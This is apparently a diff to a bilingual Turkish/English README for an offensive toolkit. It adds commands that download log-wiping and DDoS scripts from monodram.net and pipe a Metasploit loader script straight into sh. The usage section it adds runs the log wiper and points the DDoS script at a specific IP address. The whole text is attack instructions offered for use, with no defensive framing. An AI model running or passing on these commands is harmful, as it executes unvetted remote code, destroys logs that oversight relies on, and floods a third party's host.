@@ -16,5 +16,11 @@ $$ | $$ | $$ |$$ |  $$ |$$ |  $$ |
 ~~~---~~~
 Komutlar | Commands
 1-> wget https://monodram.net/shell/logsil
-2-> wget https://monodram.net/shell/ddos
-3-> curl https://monodram.net/shell/msfyukle | sh
+2-> wget https://monodram.net/shell/ddos -O ddos.pl
+3-> curl https://monodram.net/shell/msfyukle.sh | sh
+~~~---~~~
+Kullanım | Using
+1-> chmod +x 
+    ./logsil
+2-> ddos.pl -dns 88.227.11.33
+3-> ./msfyukle.sh
